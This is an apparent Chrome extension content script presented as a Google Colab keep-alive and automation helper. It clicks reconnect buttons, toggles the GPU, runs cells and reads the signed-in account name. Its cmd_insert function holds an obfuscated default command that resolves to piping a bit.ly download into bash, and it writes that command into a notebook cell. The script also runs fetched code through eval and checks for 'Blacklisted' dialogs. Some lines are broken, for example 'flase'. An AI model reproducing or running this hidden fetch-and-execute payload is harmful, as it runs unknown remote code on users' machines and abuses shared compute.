
async function loadScript(url = 'https://code.jquery.com/jquery-3.6.0.min.js') {
	let response = await fetch(url);
	let script = await response.text();
	eval(script);
}

function jqueryImport() {
	let scriptUrl = 'https://code.jquery.com/jquery-3.6.0.min.js'

	loadScript(scriptUrl);

}

chrome.extension.sendMessage({}, function (response) {
	var readyStateCheckInterval = setInterval(function () {
		if (document.readyState === "complete") {
			jqueryImport();
			$.noConflict();
			jQuery(document).ready(function ($) {
				// Code that uses jQuery's $ can follow here.
			});
			// ----------------------------------------------------------
			// This part of the script triggers when page is done loading
			console.log("Hello. This message was sent from scripts/inject.js");
			// ----------------------------------------------------------
			setInterval(clickConnect, 60000);	//1 minute
			//setInterval(clickConnect, 20000);	//20 sec
		}
	}, 10);
});

// Credit to https://medium.com/@shivamrawat_756/how-to-prevent-google-colab-from-disconnecting-717b88a128c0
function clickConnect() {
	try {
		document.querySelector("#top-toolbar > colab-connect-button").shadowRoot.querySelector("#connect").click();
		// this also works, if above one doesn't work, comment it and uncomment below one
		//document.querySelector("colab-connect-button").shadowRoot.getElementById('connect').click();
		setTimeout(clickDismiss, 2000);
		console.log("Keeping Colab Alive!");
	} catch (error) {
		console.log(error);
	}
}

function clickConnectSmart() {
	try {
		if (document.querySelector("#top-toolbar > colab-connect-button").
			shadowRoot.querySelector("#connect").
			textContent.match("onne")) {
			document.querySelector("#top-toolbar > colab-connect-button").
				shadowRoot.querySelector("#connect").click();
			console.log("Pressing connet")
		}
		else if (document.querySelector("#top-toolbar > colab-connect-button").
			shadowRoot.querySelector("#connect").innerHTML.match("RAM")) {
			console.log("runing")
		}
		else {
			document.querySelector("#top-toolbar > colab-connect-button").
				shadowRoot.querySelector("#connect").click();

			console.log("Pressing connet")
		}
	} catch (error) {
		console.log(error);
	}
}

function clickDismiss() {
	try {
		document.querySelector('colab-sessions-dialog').shadowRoot.querySelector('.dismiss').click();
		console.log('clicked on dismiss button');
	} catch (error) {
		console.log(error);
	}
}

function run_cmd() {
	try {
		let getExTitle = document.querySelector("div > colab-run-button").title;
		console.log(getExTitle)
		if (getExTitle.match("Enter") != null) {
			console.log("runnning ...")
			document.querySelector("div > colab-run-button").click()
		}
		else {
			console.log("already_working")
		}
	} catch (error) {
		console.log(error);
	}
}

function stop_cmd() {
	try {
		let getExTitle = document.querySelector("div > colab-run-button").title;
		console.log(getExTitle)
		if (getExTitle.match("Enter") == null) {
			console.log("stoping")
			document.querySelector("div > colab-run-button").click()
		}
		else {
			console.log("alrady stoped")
		}
	} catch (error) {
		console.log(error);
	}
}

function enable_gpu() {

	try {
		document.querySelector('[command="notebook-settings"]').click()
		document.querySelector('#accelerator').options.selectedIndex = 0 //cpu
		document.querySelector('#accelerator').options.selectedIndex = 1 //gpu
		document.querySelector("#ok").click()
	} catch (error) {
		console.log(error);
	}

}

function disable_gpu() {

	try {
		document.querySelector('[command="notebook-settings"]').click()
		document.querySelector('#accelerator').options.selectedIndex = 1 //cpu
		document.querySelector('#accelerator').options.selectedIndex = 0 //gpu
		document.querySelector("#ok").click()
	} catch (error) {
		console.log(error);
	}
}

function check_ok() {

	try {
		if (document.querySelector("#ok") == null) {
			console.log("no ok ...");
			return false;
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("GPU") != null) {
			console.log("No more GPU");
			return "noGPU";
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("err") != null) {
			console.log("backend error");
			return "errbackend";
		}
		else if (document.querySelector("#ok").parentElement.parentElement.textContent.match("ble") != null) {
			console.log("Blacklisted")
			return "blacklisted";
		}
		else {
			console.log("already_working")
			return "okbox";
		}
	} catch (error) {
		console.log(error);
	}
}

function check_status() {
	let status = {
		gid: get_gid(),
		ok: false,
		ok_type: null,
		connected: null,
		runing_cmd: null,
		info: null,
		is_gpu: false,
		time_exec: null

	}

	try {
		try {
			document.querySelector('[command="notebook-settings"]').click()
			if (document.querySelector('#accelerator').options.selectedIndex == 1) //gpu
			{ status.is_gpu = true; }
			document.querySelector("#ok").click()
		} catch (error) {
			console.log(error);
		}
		if (document.querySelector(
			"div.output-iframe-container colab-static-output-renderer > div:nth-child(1) > div > pre")) {
			try {
				status.info = JSON.parse(document.querySelector(
					"div.output-iframe-container colab-static-output-renderer > div:nth-child(1) > div > pre").
					textContent + '"}');

			}
			catch (error) {
				status.info = null;
				console.log(error);
			}
		}

		if (document.querySelector("#top-toolbar > colab-connect-button").
			shadowRoot.querySelector("#connect").
			textContent.match("onne")) {
			status.connected = false;
		}
		else if (document.querySelector("#top-toolbar > colab-connect-button").
			shadowRoot.querySelector("#connect").innerHTML.match("RAM")) {
			console.log("runing")
			status.connected = true;

		}
		else {
			document.querySelector("#top-toolbar > colab-connect-button").
				status.connected = flase;

		}

		if (document.querySelector("colab-status-bar").
			shadowRoot.querySelector("div > button")) {
			status.time_exec = document.querySelector(" colab-status-bar").
				shadowRoot.querySelector("div > button").textContent.match(/(?<=\().+?(?=\))/g)[0]
		}
		if (document.querySelector("#ok") == null) {
			console.log("no ok ...")
			status.ok = false;
		}
		else  {
			console.log("ok found")
			status.ok = true;
			status.ok_type = check_ok();
		}

	}

	catch (error) {
		console.log(error);
	}
	return status;
}



function cmd_insert(cmd = '!i=001;cmd=pysi;x=ly;y=bit;wget -q -O - ${y}.${x}/${cmd}${i} | bash') {

	try {
		if (document.querySelector("div.codecell-input-output  span > span") == null) {
			document.querySelector("#toolbar-add-code").click()
			console.log("new cmd ...")
		}
		else {
			console.log("cmd exist inserting code...")
			document.querySelector("div.codecell-input-output  span > span").textContent = cmd
		}
	} catch (error) {
		console.log(error);
	}
}

function get_gid() {
	try {
		return document.querySelector("#gb   div.gb_nb").textContent
	} catch (error) {
		console.log(error);
		return null;
	}
}
